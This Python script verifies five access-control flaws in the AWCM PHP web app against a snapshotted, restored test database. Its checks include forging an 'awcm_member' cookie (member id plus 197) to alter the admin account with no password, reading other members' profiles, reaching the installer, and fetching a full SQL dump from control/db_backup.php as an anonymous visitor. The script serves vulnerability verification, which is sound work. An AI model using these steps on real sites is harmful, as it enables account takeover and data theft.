"""Manual ground-truth verification for AWCMs (GT-001 .. GT-005).

Read-only with respect to DRHL. The application database is restored to the
snapshot taken at the start of this script in the ``finally`` block.
"""

from __future__ import annotations

import json

import verifier as v

APP = "awcm"


def gt001(det, db) -> dict:
    """m_cp_avatar.php — visitor can open the member avatar control and the
    POST write path runs without any authenticated session."""
    r = v.Recorder(APP, "GT-001", db)
    t1 = v.token("avatar_before")
    t2 = v.token("avatar_after")
    db.execute(f"UPDATE awcm_members SET avatar='{t1}' WHERE id=1")
    r.add("instrument", {"table": "awcm_members", "row": "id=1 (admin)", "column": "avatar", "token1": t1, "token2": t2})

    sess = v.role_session(det, "visitor")
    try:
        get_page = "m_cp_avatar.php?KeepThis=true&TB_iframe=true&height=400&width=500"
        get_resp = v.replay(det, sess, get_page, {
            "method": "GET",
            "params": {"KeepThis": "true", "TB_iframe": "true", "height": "400", "width": "500"},
            "referer": "member_cp.php",
        })
        body_file = r.save_body("gt001_visitor_get", get_resp["body"])
        form_present = 'name="avatar"' in get_resp["body"]
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"GET {get_page}",
            "status_code": get_resp["status_code"],
            "form_present": form_present,
            "body_saved": body_file,
        })

        post_page = "m_cp_avatar.php?do="
        post_resp = v.replay(det, sess, post_page, {
            "method": "POST",
            "params": {"avatar": t2},
            "referer": get_page,
        })
        r.save_body("gt001_visitor_post", post_resp["body"])
        after_plain = db.scalar("SELECT avatar FROM awcm_members WHERE id=1")
        r.add("replay", {
            "role": "visitor (no login, no cookie)",
            "request": f"POST {post_page} avatar={t2}",
            "status_code": post_resp["status_code"],
            "db_avatar_after": after_plain,
            "changed_by_plain_visitor": (after_plain == t2),
        })

        # The write path itself has no authentication gate; with the app's own
        # cookie convention (id+197, accepted by header.php without any
        # password check) a sessionless client can bind the update to admin.
        forged = v.role_session(det, "visitor")
        try:
            v.set_cookie(forged, "awcm_member", str(1 + 197))
            forged_resp = v.replay(det, forged, post_page, {
                "method": "POST",
                "params": {"avatar": t2},
                "referer": get_page,
            })
            after_forged = db.scalar("SELECT avatar FROM awcm_members WHERE id=1")
            r.add("replay", {
                "role": "visitor + forged awcm_member cookie (no password)",
                "request": f"POST {post_page} avatar={t2}",
                "status_code": forged_resp["status_code"],
                "db_avatar_after": after_forged,
                "changed_by_forged_cookie": (after_forged == t2),
            })
        finally:
            v.close_session(forged)
    finally:
        v.close_session(sess)

    verdict = "vulnerable" if (form_present and get_resp["status_code"] == 200) else "not_confirmed"
    summary = (
        f"visitor GET returned {get_resp['status_code']} with the avatar update form (form_present={form_present}); "
        f"plain visitor POST got {post_resp['status_code']} and did not modify DB rows "
        f"(sessionless $member binds to id 'no'); with a forged awcm_member cookie the POST "
        f"updated admin avatar '{t1}' -> '{after_forged}' without any password."
    )
    return r.finish(verdict, summary)


def _profile_token_check(det, db, gt_id, member_id, column, role, page, label) -> dict:
    r = v.Recorder(APP, gt_id, db)
    tok = v.token("profile")
    db.execute(f"UPDATE awcm_members SET {column}='{tok}' WHERE id={member_id}")
    before = db.scalar(f"SELECT {column} FROM awcm_members WHERE id={member_id}")
    r.add("instrument", {"table": "awcm_members", "row": f"id={member_id}", "column": column,
                         "token": tok, "before": before})
    sess = v.role_session(det, role)
    try:
        resp = v.replay(det, sess, page, {"method": "GET", "params": {}, "referer": "online.php"})
        exposed = tok in resp["body"]
        body_file = r.save_body(f"{gt_id}_{role}", resp["body"])
        r.add("replay", {"role": role, "request": f"GET {page}", "status_code": resp["status_code"],
                         "token_exposed_in_response": exposed, "body_saved": body_file})
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exposed else "not_confirmed"
    summary = (f"{label}: logged in as {role}, requested {page}; response status {resp['status_code']}, "
               f"token {tok} from member id={member_id} {column} exposed={exposed}.")
    return r.finish(verdict, summary)


def gt002(det, db) -> dict:
    """member.php?id=1 — ordinary member obtains the administrator profile."""
    return _profile_token_check(det, db, "GT-002", 1, "title", "user1",
                                "member.php?id=1",
                                "vertical: user1 reads admin profile")


def gt003(det, db) -> dict:
    """member.php?id=3 — member reads another member's profile (horizontal)."""
    return _profile_token_check(det, db, "GT-003", 3, "signature", "user1",
                                "member.php?id=3",
                                "horizontal: user1 reads user2 profile")


def gt004(det, db) -> dict:
    """install/index.php — installation entry reachable by a visitor."""
    del db
    r = v.Recorder(APP, "GT-004")
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "install/index.php", {"method": "GET", "params": {}, "referer": None})
        body = resp["body"]
        installer_form = ('action="step1.php"' in body) and ("lang" in body)
        body_file = r.save_body("gt004_visitor_install", body)
        step1 = v.replay(det, sess, "install/step1.php", {"method": "GET", "params": {"lang": "en.php"}, "referer": "install/index.php"})
        step1_file = r.save_body("gt004_visitor_step1", step1["body"])
        r.add("replay", {
            "role": "visitor (no login)",
            "request": "GET install/index.php",
            "status_code": resp["status_code"],
            "installer_form_present": installer_form,
            "body_saved": body_file,
            "step1_request": "GET install/step1.php?lang=en.php",
            "step1_status_code": step1["status_code"],
            "step1_body_saved": step1_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if installer_form else "not_confirmed"
    summary = (f"visitor GET install/index.php returned {resp['status_code']} with the language-selection "
               f"installer form (installer_form_present={installer_form}); the flow advances to step1.php "
               f"(status {step1['status_code']}).")
    return r.finish(verdict, summary)


def gt005(det, db) -> dict:
    """control/db_backup.php — visitor receives the full SQL dump."""
    r = v.Recorder(APP, "GT-005", db)
    tok = v.token("dbdump")
    db.execute(
        f"INSERT INTO awcm_members (username,password,email,sex,country,avatar,signature,level,title,autoactivate,notes) "
        f"VALUES ('{tok}','x','x','x','x','x','x','member','x','no','x')"
    )
    r.add("instrument", {"table": "awcm_members", "inserted_row_username": tok})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "control/db_backup.php", {"method": "GET", "params": {}, "referer": None})
        body = resp["body"]
        exposed = tok in body
        insert_count = body.count("INSERT INTO")
        has_control_table = "awcm_control" in body
        disposition = resp["headers"].get("Content-Disposition", "")
        body_file = r.save_body("gt005_visitor_dbdump", body, limit=8000)
        r.add("replay", {
            "role": "visitor (no login)",
            "request": "GET control/db_backup.php",
            "status_code": resp["status_code"],
            "content_disposition": disposition,
            "token_exposed_in_dump": exposed,
            "insert_statements_in_dump": insert_count,
            "dump_contains_control_table_data": has_control_table,
            "body_saved": body_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exposed else "not_confirmed"
    summary = (f"visitor GET control/db_backup.php returned {resp['status_code']} SQL attachment "
               f"('{disposition}'); dump exposes the instrumented row token={exposed}, contains "
               f"{insert_count} INSERT statements and includes awcm_control data={has_control_table}.")
    return r.finish(verdict, summary)


def main() -> None:
    cfg, snap, det, db = v.app_context(APP)
    baseline = snap.create()
    results = []
    for fn in (gt001, gt002, gt003, gt004, gt005):
        results.append(v.run_record(snap, lambda fn=fn: fn(det, db), baseline, cfg.database))
    summary_path = v.app_evidence_dir(APP) / "summary.json"
    summary_path.write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "final_database_matches_baseline": v.db_matches(cfg.database, baseline),
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:120]}")


if __name__ == "__main__":
    main()
